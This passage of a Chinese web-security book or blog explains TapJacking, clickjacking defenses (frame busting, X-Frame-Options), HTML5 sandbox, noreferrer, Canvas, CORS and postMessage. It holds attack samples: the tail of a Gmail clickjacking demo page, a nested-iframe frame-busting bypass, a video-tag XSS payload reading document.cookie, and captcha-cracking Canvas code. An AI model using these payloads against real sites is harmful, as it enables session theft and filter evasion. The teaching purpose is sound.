= document.getElementById(&quot;hide_ball_1&quot;);</div><div class="line">        hide_ball_1.style.opacity = &quot;1&quot;;</div><div class="line">        hide_ball_1.style.filter = &quot;alpha(opacity=100)&quot;;</div><div class="line">      &#125;</div><div class="line">      function reload_text() &#123;</div><div class="line">        document.getElementById(&quot;target&quot;).value = &apos;&apos;;</div><div class="line">      &#125;</div><div class="line">    &lt;/script&gt;</div><div class="line">  &lt;/head&gt;</div><div class="line"></div><div class="line">  &lt;body onload=&quot;Init();&quot;&gt;</div><div class="line">    &lt;center&gt;</div><div class="line">      &lt;h1&gt;</div><div class="line">        Gmail Clickjacking with drag and drop Attack</div><div class="line">      &lt;/h1&gt;</div><div class="line">    &lt;/center&gt;</div><div class="line">    &lt;img id=&quot;hide_ball&quot; src=ball.png class=&quot;ball&quot;&gt;</div><div class="line">    &lt;div id=&quot;source&quot;&gt;</div><div class="line">      &lt;iframe id=&quot;iframe_1&quot; src=&quot;https://mail.google.com/mail/ig/mailmax&quot;</div><div class="line">class=&quot;iframe_hidden&quot;</div><div class="line">      scrolling=&quot;no&quot;&gt;</div><div class="line">      &lt;/iframe&gt;</div><div class="line">    &lt;/div&gt;</div><div class="line">    &lt;img src=Dolphin.jpg class=&quot;Dolphin&quot;&gt;</div><div class="line">    &lt;div&gt;</div><div class="line">      &lt;img id=&quot;hide_ball_1&quot; src=ball.png class=&quot;ball_1&quot;&gt;</div><div class="line">    &lt;/div&gt;</div><div class="line">    &lt;div&gt;</div><div class="line">      &lt;textarea id=&quot;target&quot; class=&quot;text_area_hidden&quot;&gt;</div><div class="line">      &lt;/textarea&gt;</div><div class="line">    &lt;/div&gt;</div><div class="line">    &lt;div id=&quot;info&quot; style=&quot;position:absolute;background-color:#e0e0e0;font-weight:bold;</div><div class="line">top:600px;&quot;&gt;</div><div class="line">    &lt;/div&gt;</div><div class="line">    &lt;center&gt;</div><div class="line">      Note: Clicking &quot;ctrl + a&quot; to select the ball, then drag it to the</div><div class="line">      &lt;br&gt;</div><div class="line">      mouth of the dolphin with the mouse.Make sure you have logged into GMAIL.</div><div class="line">      &lt;br&gt;</div><div class="line">    &lt;/center&gt;</div><div class="line">    &lt;br&gt;</div><div class="line">    &lt;br&gt;</div><div class="line">    &lt;div class=&quot;center&quot;&gt;</div><div class="line">      &lt;center&gt;</div><div class="line">        &lt;center&gt;</div><div class="line">          &lt;input id=&quot;showHide_frame&quot; type=&quot;checkbox&quot;</div><div class="line">onclick=&quot;showHide_frame.call(this);&quot;</div><div class="line">          /&gt;</div><div class="line">          &lt;label for=&quot;showHide_frame&quot;&gt;</div><div class="line">            Show the jacked I--Frame</div><div class="line">          &lt;/label&gt;</div><div class="line">          |</div><div class="line">          &lt;input id=&quot;showHide_text&quot; type=&quot;checkbox&quot; onclick=&quot;showHide_text.call(this);&quot;</div><div class="line">          /&gt;</div><div class="line">          &lt;label for=&quot;showHide_text&quot;&gt;</div><div class="line">            Show the jacked Textarea</div><div class="line">          &lt;/label&gt;</div><div class="line">          |</div><div class="line">          &lt;input type=button value=&quot;Replay&quot; onclick=&quot;location.reload();reload_text();&quot;&gt;</div><div class="line">        &lt;/center&gt;</div><div class="line">        &lt;br&gt;&lt;br&gt;</div><div class="line">        &lt;b&gt;</div><div class="line">          Design by</div><div class="line">          &lt;a target=&quot;_blank&quot; href=&quot;http://hi.baidu.com/xisigr&quot;&gt;</div><div class="line">            xisigr</div><div class="line">          &lt;/a&gt;</div><div class="line">        &lt;/b&gt;</div><div class="line">      &lt;/center&gt;</div><div class="line">    &lt;/div&gt;</div><div class="line">  &lt;/body&gt;</div><div class="line"></div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
<p>这是一个非常精彩的案例。</p>
<p><hr /></p>
<h3 id="5-5-ClickJacking-3-0：触屏劫持"><a href="#5-5-ClickJacking-3-0：触屏劫持" class="headerlink" title="5.5 ClickJacking 3.0：触屏劫持"></a>5.5 ClickJacking 3.0：触屏劫持</h3><p>到了2010年9月，智能手机上的“触屏劫持”攻击被斯坦福的安全研究者公布，这意味着ClickJacking的攻击方式更进一步。安全研究者将这种触屏劫持称为TapJacking。<br>以苹果公司的iPhone为代表，智能手机为人们提供了更先进的操控方式：触屏。从手机OS的角度来看，触屏实际上就是一个事件，手机OS捕捉这些事件，并执行相应的动作。<br>比如一次触屏操作，可能会对应以下几个事件：<br>touchstart，手指触摸屏幕时发生；<br>touchend，手指离开屏幕时发生；<br>touchmove，手指滑动时发生；<br>touchcancel，系统可取消touch事件。<br>通过将一个不可见的iframe覆盖到当前网页上，可以劫持用户的触屏操作。</p>
<p>而手机上的屏幕范围有限，手机浏览器为了节约空间，甚至隐藏了地址栏，因此手机上的视觉欺骗可能会变得更加容易实施。比如下面这个例子：手机屏幕的视觉欺骗<br>左边的图片，最上方显示了浏览器地址栏，同时攻击者在页面中画出了一个假的地址栏；<br>中间的图片，真实的浏览器地址栏已经自动隐藏了，此时页面中只剩下假的地址栏；<br>右边的图片，是浏览器地址栏被正常隐藏的情况。<br>这种针对视觉效果的攻击可以被利用进行钓鱼和欺诈。<br>2010年12月，研究者发现在Android系统中实施TapJacking甚至可以修改系统的安全设置，并同时给出了演示。<br>在未来，随着移动设备中浏览器功能的丰富，也许我们会看到更多TapJacking的攻击方式。</p>
<p><hr /></p>
<h3 id="5-6-防御ClickJacking"><a href="#5-6-防御ClickJacking" class="headerlink" title="5.6 防御ClickJacking"></a>5.6 防御ClickJacking</h3><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">防御ClickJacking</div></pre></td></tr></table></figure>
<p>针对传统的ClickJacking，一般是通过禁止跨域的iframe来防范。</p>
<p><hr /></p>
<h3 id="5-6-1-frame-busting"><a href="#5-6-1-frame-busting" class="headerlink" title="5.6.1 frame busting"></a>5.6.1 frame busting</h3><p>frame busting</p>
<p>通常可以写一段JavaScript代码，以禁止iframe的嵌套。这种方法叫frame busting。比如下面这段代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">if ( top.location != location ) &#123;</div><div class="line">    top.location = self.location;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>常见的frame busting有以下这些方式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">if (top != self)</div><div class="line">if (top.location != self.location)</div><div class="line">if (top.location != location)</div><div class="line">if (parent.frames.length &gt; 0)</div><div class="line">if (window != top)</div><div class="line">if (window.top !== window.self)</div><div class="line">if (window.self != window.top)</div><div class="line">if (parent &amp;&amp; parent != window)</div><div class="line">if (parent &amp;&amp; parent.frames &amp;&amp; parent.frames.length&gt;0)</div><div class="line">if((self.parent&amp;&amp;!(self.parent===self))&amp;&amp;(self.parent.frames.length!=0))</div><div class="line">top.location = self.location</div><div class="line">top.location.href = document.location.href</div><div class="line">top.location.href = self.location.href</div><div class="line">top.location.replace(self.location)</div><div class="line">top.location.href = window.location.href</div><div class="line">top.location.replace(document.location)</div><div class="line">top.location.href = window.location.href</div><div class="line">top.location.href = &quot;URL&quot;</div><div class="line">document.write(&apos;&apos;)</div><div class="line">top.location = location</div><div class="line">top.location.replace(document.location)</div><div class="line">top.location.replace(&apos;URL&apos;)</div><div class="line">top.location.href = document.location</div><div class="line">top.location.replace(window.location.href)</div><div class="line">top.location.href = location.href</div><div class="line">self.parent.location = document.location</div><div class="line">parent.location.href = self.document.location</div><div class="line">top.location.href = self.location</div><div class="line">top.location = window.location</div><div class="line">top.location.replace(window.location.pathname)</div><div class="line">window.top.location = window.self.location</div><div class="line">setTimeout(function()&#123;document.body.innerHTML=&apos;&apos;;&#125;,1);</div><div class="line">window.self.onload = function(evt)&#123;document.body.innerHTML=&apos;&apos;;&#125;</div><div class="line">var url = window.location.href; top.location.replace(url)</div></pre></td></tr></table></figure>
<p>但是frame busting也存在一些缺陷。由于它是用JavaScript写的，控制能力并不是特别强，因此有许多方法可以绕过它。<br>比如针对parent.location的frame busting，就可以采用嵌套多个iframe的方法绕过。假设frame busting代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">if ( top.location != self.location) &#123;</div><div class="line">   parent.location = self.location ;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>那么通过以下方式即可绕过上面的保护代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">Attacker top frame:</div><div class="line">&lt;iframe src=&quot;attacker2 .html&quot;&gt;</div><div class="line">Attacker sub-frame:</div><div class="line">&lt;iframe src=&quot;http://www.victim.com&quot;&gt;</div></pre></td></tr></table></figure>
<p>此外，像HTML 5中iframe的sandbox属性、IE中iframe的security属性等，都可以限制iframe页面中的JavaScript脚本执行，从而可以使得frame busting失效。<br>斯坦福的Gustav Rydstedt等人总结了一篇关于“攻击frame busting”的paper：“Busting frame busting: a study of clickjacking vulnerabilities at popular sites”，详细讲述了各种绕过frame busting的方法。</p>
<p><hr /></p>
<h3 id="5-6-2-X-Frame-Options"><a href="#5-6-2-X-Frame-Options" class="headerlink" title="5.6.2 X-Frame-Options"></a>5.6.2 X-Frame-Options</h3><p>因为frame busting存在被绕过的可能，所以我们需要寻找其他更好的解决方案。一个比较好的方案是使用一个HTTP头——X-Frame-Options。<br>X-Frame-Options可以说是为了解决ClickJacking而生的，目前有以下浏览器开始支持X-Frame-Options：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">IE 8+</div><div class="line">Opera 10.50+</div><div class="line">Safari 4+</div><div class="line">Chrome 4.1.249.1042+</div><div class="line">Firefox 3.6.9 (or earlier with NoScript)</div></pre></td></tr></table></figure>
<p>它有三个可选的值：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">DENY</div><div class="line">SAMEORIGIN</div><div class="line">ALLOW-FROM origin</div></pre></td></tr></table></figure>
<p>当值为DENY时，浏览器会拒绝当前页面加载任何frame页面；若值为SAMEORIGIN，则frame页面的地址只能为同源域名下的页面；若值为ALLOW-FROM，则可以定义允许frame加载的页面地址。</p>
<p>除了  <code>X-Frame-Options</code>之外，Firefox的<code>Content Security Policy</code>以及Firefox的NoScript扩展也能够有效防御ClickJacking，这些方案为我们提供了更多的选择。</p>
<p><hr /></p>
<h3 id="5-7-小结"><a href="#5-7-小结" class="headerlink" title="5.7 小结"></a>5.7 小结</h3><p><code>ClickJacking</code></p>
<p><code>ClickJacking</code>相对于XSS与CSRF来说，因为需要诱使用户与页面产生交互行为，因此实施攻击的成本更高，在网络犯罪中比较少见。但<code>ClickJacking</code>在未来仍然有可能被攻击者利用在钓鱼、欺诈和广告作弊等方面，不可不察。</p>
<p><hr /></p>
<h3 id="6-1-1-新标签的XSS"><a href="#6-1-1-新标签的XSS" class="headerlink" title="6.1.1　新标签的XSS"></a>6.1.1　新标签的XSS</h3><p>新标签的XSS</p>
<p>HTML 5定义了很多新标签、新事件，这有可能带来新的XSS攻击。<br>一些XSS Filter如果建立了一个黑名单的话，则可能就不会覆盖到HTML 5新增的标签和功能，从而避免发生XSS。<br>笔者曾经在百度空间做过一次测试，使用的是HTML 5中新增的<video>标签，这个标签可以在网页中远程加载一段视频。与<video>标签类似的还有<audio>标签，用于远程加载一段音频。测试如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">"http://tinyvid.tv/file/29d6g90a204i1.ogg"</span></div><div class="line"><span class="attr">onloadedmetadata</span>=<span class="string">"alert(document.cookie);"</span> <span class="attr">ondurationchanged</span>=<span class="string">"alert(/XSS2/);"</span></div><div class="line"><span class="attr">ontimeupdate</span>=<span class="string">"alert(/XSS1/);"</span> <span class="attr">tabindex</span>=<span class="string">"0"</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">video</span>&gt;</span></div></pre></td></tr></table></figure>
<p>成功地绕过了百度空间的XSS Filter：<br>百度空间的XSS<br>HTML 5中新增的一些标签和属性，使得XSS等Web攻击产生了新的变化，为了总结这些变化，有安全研究者建立了一个HTML5 Security Cheatsheet项目，如下所示：<br>此项目对研究HTML 5安全有着重要作用。</p>
<p><hr /></p>
<h3 id="6-1-2-iframe的sandbox"><a href="#6-1-2-iframe的sandbox" class="headerlink" title="6.1.2 iframe的sandbox"></a>6.1.2 iframe的sandbox</h3><p>iframe的sandbox</p>
<p><code>&lt;iframe&gt;</code>标签一直以来都为人所诟病。挂马、XSS、ClickJacking等攻击中都能看到它不光彩的身影。浏览器厂商也一直在想办法限制iframe执行脚本的权限，比如跨窗口访问会有限制，以及IE中的<iframe>标签支持security属性限制脚本的执行，都在向着这一目标努力。<br>在HTML 5中，专门为iframe定义了一个新的属性，叫sandbox。使用sandbox这一个属性后，<code>&lt;iframe&gt;</code>标签加载的内容将被视为一个独立的“源”（源的概念请参考“同源策略”），其中的脚本将被禁止执行，表单被禁止提交，插件被禁止加载，指向其他浏览对象的链接也会被禁止。<br>sandbox属性可以通过参数来支持更精确的控制。有以下几个值可以选择：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">allow-same-origin：允许同源访问；</div><div class="line">allow-top-navigation：允许访问顶层窗口；</div><div class="line">allow-forms：允许提交表单；</div><div class="line">allow-scripts：允许执行脚本。</div><div class="line">可有的行为即便是设置了allow-scripts，也是不允许的，比如“弹出窗口”。</div></pre></td></tr></table></figure>
<p>一个iframe的实例如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">sandbox</span>=<span class="string">"allow-same-origin allow-forms allow-scripts"</span></div><div class="line"><span class="attr">src</span>=<span class="string">"http://maps.example.com/embedded.html"</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></div></pre></td></tr></table></figure>
<p>毫无疑问，iframe的sandbox属性将极大地增强应用使用iframe的安全性。</p>
<p><hr /></p>
<h3 id="6-1-3-Link-Types-noreferrer"><a href="#6-1-3-Link-Types-noreferrer" class="headerlink" title="6.1.3 Link Types: noreferrer"></a>6.1.3 Link Types: noreferrer</h3><p>Link Types: noreferrer</p>
<p>在HTML 5中为<code>&lt;a&gt;</code>标签和<code>&lt;area&gt;</code>标签定义了一个新的Link Types：noreferrer。<br>顾名思义，标签指定了noreferrer后，浏览器在请求该标签指定的地址时将不再发送Referer。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;a href=&quot;xxx&quot; rel=&quot;noreferrer&quot; &gt;test&lt;/a&gt;</div></pre></td></tr></table></figure>
<p>这种设计是出于保护敏感信息和隐私的考虑。因为通过Referer，可能会泄露一些敏感信息。<br>这个标签需要开发者手动添加到页面的标签中，对于有需求的标签可以选择使用noreferrer。</p>
<p><hr /></p>
<h3 id="6-1-4-Canvas的妙用"><a href="#6-1-4-Canvas的妙用" class="headerlink" title="6.1.4 Canvas的妙用"></a>6.1.4 Canvas的妙用</h3><p>Canvas的妙用</p>
<p>Canvas可以说是HTML 5中最大的创新之一。不同于<img>标签只是远程加载一个图片，<canvas>标签让JavaScript可以在页面中直接操作图片对象，也可以直接操作像素，构造出图片区域。Canvas的出现极大地挑战了传统富客户端插件的地位，开发者甚至可以用Canvas在浏览器上写一个小游戏。<br>下面是一个简单的Canvas的用例。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE HTML&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line"></div><div class="line">  <span class="tag">&lt;<span class="name">canvas</span> <span class="attr">id</span>=<span class="string">"myCanvas"</span> <span class="attr">width</span>=<span class="string">"200"</span> <span class="attr">height</span>=<span class="string">"100"</span> <span class="attr">style</span>=<span class="string">"border:1px solid #c3c3c3;"</span>&gt;</span></div><div class="line">    Your browser does not support the canvas element.</div><div class="line">  <span class="tag">&lt;/<span class="name">canvas</span>&gt;</span></div><div class="line"></div><div class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="javascript"></div><div class="line"></div><div class="line">  <span class="keyword">var</span> c=<span class="built_in">document</span>.getElementById(<span class="string">"myCanvas"</span>);</div><div class="line">  <span class="keyword">var</span> cxt=c.getContext(<span class="string">"2d"</span>);</div><div class="line">  cxt.fillStyle=<span class="string">"#FF0000"</span>;</div><div class="line">  cxt.fillRect(<span class="number">0</span>,<span class="number">0</span>,<span class="number">150</span>,<span class="number">75</span>);</div><div class="line"></div><div class="line">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
<p>在支持Canvas的浏览器上，将描绘出一个图片。</p>
<p>在以下浏览器中，开始支持<canvas>标签。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">IE 7.0+</div><div class="line">Firefox 3.0+</div><div class="line">Safari 3.0+</div><div class="line">Chrome 3.0+</div><div class="line">Opera 10.0+</div><div class="line">iPhone 1.0+</div><div class="line">Android 1.0+</div></pre></td></tr></table></figure>
<p>Dive Into HTML5很好地介绍了Canvas及其他HTML 5的特性。</p>
<p>Canvas提供的强大功能，甚至可以用来破解验证码。Shaun Friedle写了一个GreaseMonkey的脚本，通过JavaScript操作Canvas中的每个像素点，成功地自动化识别了Megaupload提供的验证码。<br>Megaupload验证码<br>其大致过程如下。<br>首先，将图片导入Canvas，并进行转换。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">convert_grey</span>(<span class="params">image_data</span>)</span>&#123;</div><div class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> x = <span class="number">0</span>; x &lt; image_data.width; x++)&#123;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> y = <span class="number">0</span>; y &lt; image_data.height; y++)&#123;</div><div class="line">      <span class="keyword">var</span> i = x*<span class="number">4</span>+y*<span class="number">4</span>*image_data.width;</div><div class="line">      <span class="keyword">var</span> luma = <span class="built_in">Math</span>.floor(image_data.data[i] * <span class="number">299</span>/<span class="number">1000</span> +</div><div class="line">        image_data.data[i+<span class="number">1</span>] * <span class="number">587</span>/<span class="number">1000</span> +</div><div class="line">        image_data.data[i+<span class="number">2</span>] * <span class="number">114</span>/<span class="number">1000</span>);</div><div class="line">        image_data.data[i] = luma;</div><div class="line">        image_data.data[i+<span class="number">1</span>] = luma;</div><div class="line">        image_data.data[i+<span class="number">2</span>] = luma;</div><div class="line">        image_data.data[i+<span class="number">3</span>] = <span class="number">255</span>;</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="comment">//分割不同字符，此处很简单，因为三个字符都使用了不同颜色。</span></div><div class="line">  filter(image_data[<span class="number">0</span>], <span class="number">105</span>);</div><div class="line">  filter(image_data[<span class="number">1</span>], <span class="number">120</span>);</div><div class="line">  filter(image_data[<span class="number">2</span>], <span class="number">135</span>);</div><div class="line"></div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">image_data, colour</span>)</span>&#123;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> x = <span class="number">0</span>; x &lt; image_data.width; x++)&#123;</div><div class="line">      <span class="keyword">for</span> (<span class="keyword">var</span> y = <span class="number">0</span>; y &lt; image_data.height; y++)&#123;</div><div class="line">        <span class="keyword">var</span> i = x*<span class="number">4</span>+y*<span class="number">4</span>*image_data.width;</div><div class="line">        <span class="comment">// Turn all the pixels of the certain colour to white</span></div><div class="line">        <span class="keyword">if</span> (image_data.data[i] == colour) &#123;</div><div class="line">          image_data.data[i] = <span class="number">255</span>;</div><div class="line">          image_data.data[i+<span class="number">1</span>] = <span class="number">255</span>;</div><div class="line">          image_data.data[i+<span class="number">2</span>] = <span class="number">255</span>;</div><div class="line"></div><div class="line">          <span class="comment">// Everything else to black</span></div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">          image_data.data[i] = <span class="number">0</span>;</div><div class="line">          image_data.data[i+<span class="number">1</span>] = <span class="number">0</span>;</div><div class="line">          image_data.data[i+<span class="number">2</span>] = <span class="number">0</span>;</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">  &#125;</div></pre></td></tr></table></figure>
<p>将字符从背景中分离出来，判断背景颜色即可。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> i = x*<span class="number">4</span>+y*<span class="number">4</span>*image_data.width;</div><div class="line"><span class="keyword">var</span> above = x*<span class="number">4</span>+(y<span class="number">-1</span>)*<span class="number">4</span>*image_data.width;</div><div class="line"><span class="keyword">var</span> below = x*<span class="number">4</span>+(y+<span class="number">1</span>)*<span class="number">4</span>*image_data.width;</div><div class="line"><span class="keyword">if</span> (image_data.data[i] == <span class="number">255</span> &amp;&amp;</div><div class="line">  image_data.data[above] == <span class="number">0</span> &amp;&amp;</div><div class="line">  image_data.data[below] == <span class="number">0</span>)  &#123;</div><div class="line">    image_data.data[i] = <span class="number">0</span>;</div><div class="line">    image_data.data[i+<span class="number">1</span>] = <span class="number">0</span>;</div><div class="line">    image_data.data[i+<span class="number">2</span>] = <span class="number">0</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="comment">//再将结果重新绘制。</span></div><div class="line">  cropped_canvas.getContext(<span class="string">"2d"</span>).fillRect(<span class="number">0</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">25</span>);</div><div class="line">  <span class="keyword">var</span> edges = find_edges(image_data[i]);</div><div class="line">  cropped_canvas.getContext(<span class="string">"2d"</span>).drawImage(canvas, edges[<span class="number">0</span>], edges[<span class="number">1</span>],</div><div class="line">    edges[<span class="number">2</span>]-edges[<span class="number">0</span>], edges[<span class="number">3</span>]-edges[<span class="number">1</span>], <span class="number">0</span>, <span class="number">0</span>,</div><div class="line">    edges[<span class="number">2</span>]-edges[<span class="number">0</span>], edges[<span class="number">3</span>]-edges[<span class="number">1</span>]);</div><div class="line">    image_data[i] = cropped_canvas.getContext(<span class="string">"2d"</span>).getImageData(<span class="number">0</span>, <span class="number">0</span>,</div><div class="line">      cropped_canvas.width, cropped_canvas.height);</div></pre></td></tr></table></figure>
<p>完整的实现可以参考前文注释中提到的UserScripts代码。<br>在此基础上，作者甚至能够破解一些更为复杂的验证码，比如：</p>
<p>破解验证码</p>
<p>通过Canvas自动破解验证码，最大的好处是可以在浏览器环境中实现在线破解，大大降低了攻击的门槛。HTML 5使得过去难以做到的事情，变为可能。</p>
<p><hr /></p>
<h3 id="6-2-1-Cross-Origin-Resource-Sharing"><a href="#6-2-1-Cross-Origin-Resource-Sharing" class="headerlink" title="6.2.1 Cross-Origin Resource Sharing"></a>6.2.1 Cross-Origin Resource Sharing</h3><p>浏览器实现的同源策略（<code>Same Origin Policy</code>）限制了脚本的跨域请求。但互联网的发展趋势是越来越开放的，因此跨域访问的需求也变得越来越迫切。同源策略给Web开发者带来了很多困扰，他们不得不想方设法地实现一些“合法”的跨域技术，由此诞生了<code>jsonp</code>、<code>iframe</code>跨域等技巧。</p>
<p>W3C委员会决定制定一个新的标准来解决日益迫切的跨域访问问题。这个新的标准叙述如下。<br>假设从<code>http://www.a.com/test.html</code>发起一个跨域的XMLHttpRequest请求，请求的地址为：<code>http://www.b.com/test.php</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">   var client = new XMLHttpRequest();</div><div class="line">   client.open(&quot;GET&quot;, &quot;http://www.b.com/test.php&quot;);</div><div class="line">   client.onreadystatechange = function() &#123; &#125;</div><div class="line">   client.send(null);</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
<p>如果是在IE 8中，则需要使用XDomainRequest来实现跨域请求。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">var request = new XDomainRequest();</div><div class="line">request.open(&quot;GET&quot;, xdomainurl);</div><div class="line">request.send();如果服务器www.b.com返回一个HTTP Header： www.b.com</div><div class="line">Access-Control-Allow-Origin: http://www.a.com</div></pre></td></tr></table></figure>
<p>代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;?php</div><div class="line">header(&quot;Access-Control-Allow-Origin: *&quot;);</div><div class="line">  ?&gt;</div><div class="line">Cross Domain Request Test!</div></pre></td></tr></table></figure>
<p>那么这个来自<code>http://www.a.com/test.html</code>的跨域请求就会被通过。<br>在这个过程中，<code>http://www.a.com/test.html</code>发起的请求还必须带上一个 <code>Origin Header：Origin: http://www.a.com</code></p>
<p>在Firefox上，可以抓包分析这个过程。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">GET http://www.b.com/test.php HTTP/1.1</div><div class="line">Host: www.b.com</div><div class="line">User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1b2) Gecko/20081201</div><div class="line">Firefox/3.1b2 Paros/3.2.13</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</div><div class="line">Accept-Language: zh-cn,zh;q=0.5</div><div class="line">Accept-Charset: gb2312,utf-8;q=0.7,*;q=0.7</div><div class="line">Keep-Alive: 300</div><div class="line">Proxy-Connection: keep-alive</div><div class="line">Referer: http://www.a.com/test.html</div><div class="line">Origin: http://www.a.com</div><div class="line">Cache-Control: max-age=0</div><div class="line"></div><div class="line"></div><div class="line">HTTP/1.1 200 OK</div><div class="line">Date: Thu, 15 Jan 2009 06:28:54 GMT</div><div class="line">Server: Apache/2.0.63 (Win32) PHP/5.2.6</div><div class="line">X-Powered-By: PHP/5.2.6</div><div class="line">Access-Control-Allow-Origin: *</div><div class="line">Content-Length: 28</div><div class="line">Content-Type: text/html</div><div class="line"></div><div class="line">Cross Domain Request Test!</div></pre></td></tr></table></figure>
<p>Origin Header用于标记HTTP发起的“源”，服务器端通过识别浏览器自动带上的这个Origin Header，来判断浏览器的请求是否来自一个合法的“源”。Origin Header可以用于防范CSRF，它不像Referer那么容易被伪造或清空。</p>
<p>在上面的例子中，服务器端返回：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">Access-Control-Allow-Origin: *</div></pre></td></tr></table></figure>
<p>从而允许客户端的跨域请求通过。在这里使用了通配符<code>*</code>，这是极其危险的，它将允许来自任意域的跨域请求访问成功。这就好像Flash策略中的<code>allow-access-from: *</code>一样，等于没有做任何安全限制。<br>对于这个跨域访问的标准，还有许多HTTP Header可以用于进行更精确的控制：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">4 Syntax</div><div class="line">4.1 Access-Control-Allow-Origin HTTP Response Header</div><div class="line">4.2 Access-Control-Max-Age HTTP Response Header</div><div class="line">4.3 Access-Control-Allow-Credentials HTTP Response Header</div><div class="line">4.4 Access-Control-Allow-Methods HTTP Response Header</div><div class="line">4.5 Access-Control-Allow-Headers HTTP Response Header</div><div class="line">4.6 Origin HTTP Request Header</div><div class="line">4.7 Access-Control-Request-Method HTTP Request Header</div><div class="line">4.8 Access-Control-Request-Hea</div></pre></td></tr></table></figure>
<p><hr /></p>
<h3 id="6-2-2-postMessage——跨窗口传递消息"><a href="#6-2-2-postMessage——跨窗口传递消息" class="headerlink" title="6.2.2 postMessage——跨窗口传递消息"></a>6.2.2 postMessage——跨窗口传递消息</h3><p><hr /><br>postMessage——跨窗口传递消息</p>
<p>在“跨站脚本攻击”一章中，曾经提到利用window.name来跨窗口、跨域传递信息。实际上，window这个对象几乎是不受同源策略限制的，很多脚本攻击都巧妙地利用了window对象的这一特点。<br>在HTML 5中，为了丰富Web开发者的能力，制定了一个新的API：postMessage。在Firefox 3、IE 8、Opera 9等浏览器中，都已经开始支持这个API。</p>
<p>postMessage允许每一个window（包括当前窗口、弹出窗口、iframes等）对象往其他的窗口发送文本消息，从而实现跨窗口的消息传递。这个功能是不受同源策略限制的。</p>
<p>发送窗口：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"http://dev.jquery.com/~john/message/"</span> <span class="attr">id</span>=<span class="string">"iframe"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">"form"</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">id</span>=<span class="string">"msg"</span> <span class="attr">value</span>=<span class="string">"Message to send"</span>/&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></div><div class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">  <span class="keyword">var</span> win = <span class="built_in">document</span>.getElementById(<span class="string">"iframe"</span>).contentWindow;</div><div class="line">  <span class="built_in">document</span>.getElementById(<span class="string">"form"</span>).onsubmit = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</div><div class="line">    win.postMessage( <span class="built_in">document</span>.getElementById(<span class="string">"msg"</span>).value );</div><div class="line">    e.preventDefault();</div><div class="line">  &#125;;</div><div class="line">&#125;;</div><div class="line"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"></div><div class="line"><span class="comment">&lt;!--接收窗口：--&gt;</span></div><div class="line"><span 